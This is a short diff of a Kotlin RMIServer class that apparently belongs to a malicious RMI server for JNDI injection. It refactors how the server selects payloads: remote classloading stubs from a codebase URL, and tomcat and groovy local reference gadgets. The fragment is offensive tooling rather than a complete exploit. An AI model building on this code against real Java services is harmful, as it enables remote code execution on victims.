@@ -129,10 +129,10 @@ class RMIServer {
      */
     private fun dispatch(path: String, dos: DataOutputStream) {
         val rmiKey = path.substringBefore("/")
-        val httpKey = path.substringAfter("/")
+        val payloadType = path.substringAfter("/")
 
         dos.writeByte(TransportConstants.Return.toInt())
-        val mos = MarshalOutputStream(dos, URL("$codebase#$httpKey")).apply {
+        val mos = MarshalOutputStream(dos, URL("$codebase#$payloadType")).apply {
             writeByte(TransportConstants.NormalReturn.toInt())
             UID().write(this)
         }
@@ -140,12 +140,12 @@ class RMIServer {
         // key 和方法名一致
         val ref: Reference = when (rmiKey) {
             "ref" -> {
-                log("Sending remote classloading stub ($httpKey)")
-                ref(httpKey)
+                log("Sending remote classloading stub ($payloadType)")
+                ref(payloadType)
             }
             "tomcat" -> {
                 log("Sending local classloading reference (tomcat)")
-                el()
+                tomcat(payloadType)
             }
             "groovy" -> {
                 log("Sending local classloading reference (groovy)")
